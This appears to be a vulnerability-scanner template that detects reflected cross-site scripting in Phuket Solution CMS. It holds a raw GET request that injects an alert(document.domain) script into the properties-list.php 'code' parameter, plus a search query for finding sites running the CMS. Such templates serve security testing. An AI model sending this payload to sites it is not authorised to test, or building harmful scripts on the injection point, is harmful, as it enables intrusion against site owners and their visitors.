http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "text/html")
    - contains(body, "<script>alert(document.domain)</script>") && contains(body,
      "Phuket Solution")
    type: dsl
  raw:
  - 'GET /properties-list.php?property-types=1&types=2&location=&prices=&bedroom=&code=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
    HTTP/1.1

    Host: {{Hostname}}

    '
id: phuket-cms-xss
info:
  author: r3Y3r53
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
  description: 'Phuket Solutions CMS is vulnerable to Reflected XSS in which an attacker
    injects malicious executable scripts into the code of a trusted application or
    website.

    '
  metadata:
    google-query: intext:"Developed by Phuket Solution"
    max-request: 1
    verified: true
  name: Phuket Solution CMS - Cross Site Scripting
  reference:
  - https://www.exploitalert.com/view-details.html?id=36234
  severity: medium
  tags: xss,phuket,phuket-cms
